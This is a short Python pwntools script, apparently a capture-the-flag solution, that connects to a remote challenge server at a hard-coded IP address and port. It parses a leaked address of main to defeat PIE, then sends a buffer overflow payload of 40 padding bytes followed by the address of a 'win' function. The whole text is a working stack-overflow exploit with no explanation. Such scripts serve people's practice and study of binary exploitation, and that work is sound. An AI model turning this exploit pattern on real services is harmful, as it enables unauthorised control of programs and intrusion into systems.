from pwn import *

elf = context.binary = ELF('./pie')
p = remote('159.223.192.150', 9004)

# elf = context.binary = ELF(p)

# elf = ELF('./challenge')
# p = process()

p.recvuntil('Leaked address: ')
main = int(p.recvline(), 16)

# winf = int(p.recvline(), 16)

print(hex(main))
print(hex(elf.sym['main']))
print(elf.address)

elf.address = main - elf.sym['main']

print(hex(elf.address))

payload = b'A' * 40
payload += p64(elf.sym['win'])
# payload += b"\n"



# print(p.clean().decode('latin-1'))
print(p.recv())

p.sendline(payload)
print(p.recv())
